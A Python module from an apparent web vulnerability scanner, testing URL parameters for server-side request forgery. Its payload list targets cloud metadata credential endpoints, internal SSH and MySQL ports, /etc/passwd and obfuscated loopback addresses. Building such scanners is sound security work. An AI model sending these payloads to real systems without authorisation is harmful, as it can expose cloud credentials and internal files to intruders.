"""
Server-Side Request Forgery (SSRF) Scanner.

Tests if the application makes server-side requests to attacker-controlled
or internal URLs when provided in parameters.

Detection: internal IP/metadata content, response timing, protocol-based tests.
"""

import time
from core.http_client import get
from core.config import ScannerConfig
from core.response_analyzer import (
    get_baseline, diff_responses, detect_waf_block,
    calculate_confidence, make_finding,
)
from core.utils import inject_into_params

SSRF_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "hostname", "iam"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
    ("http://metadata.google.internal/computeMetadata/v1/", ["project", "instance"]),
    ("http://169.254.169.254/metadata/instance", ["compute", "network"]),
    ("http://127.0.0.1:22/", ["SSH", "OpenSSH"]),
    ("http://127.0.0.1:3306/", ["mysql", "MariaDB"]),
    ("file:///etc/passwd", ["root:x:0:0"]),
    ("file:///c:/windows/win.ini", ["[extensions]"]),
    ("http://0x7f000001/", []),
    ("http://2130706433/", []),
]


def test_ssrf(url):
    baseline = get_baseline(url, get)

    for payload, indicators in SSRF_PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                start = time.time()
                r = get(crafted_url, timeout=10)
                elapsed = time.time() - start

                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                text_lower = r.text.lower()
                signals = {}
                evidence = ""

                for ind in indicators:
                    ind_lower = ind.lower()
                    if ind_lower in text_lower and ind_lower not in baseline["text_lower"]:
                        signals["file_content"] = True
                        evidence = ind
                        break

                sim = diff_responses(baseline["text"], r.text)
                signals["response_diff"] = sim < ScannerConfig.DIFF_THRESHOLD
                signals["content_length"] = abs(len(r.text) - baseline["content_length"]) > 200

                if elapsed < baseline["elapsed"] * 0.3 and elapsed < 0.5:
                    signals["timing_anomaly"] = True

                # Require actual internal content match for SSRF confirmation
                # timing_anomaly + response_diff alone are not sufficient
                # (many params naturally produce different/faster responses)
                if not signals.get("file_content"):
                    continue

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    return make_finding(
                        url, "Server-Side Request Forgery (SSRF)", confidence, signals,
                        details=f"SSRF via param '{param}' to {payload[:50]}",
                        severity="Critical" if "169.254" in payload else "High",
                        payload=payload, evidence=evidence, parameter=param,
                    )
            except Exception:
                continue

    return None
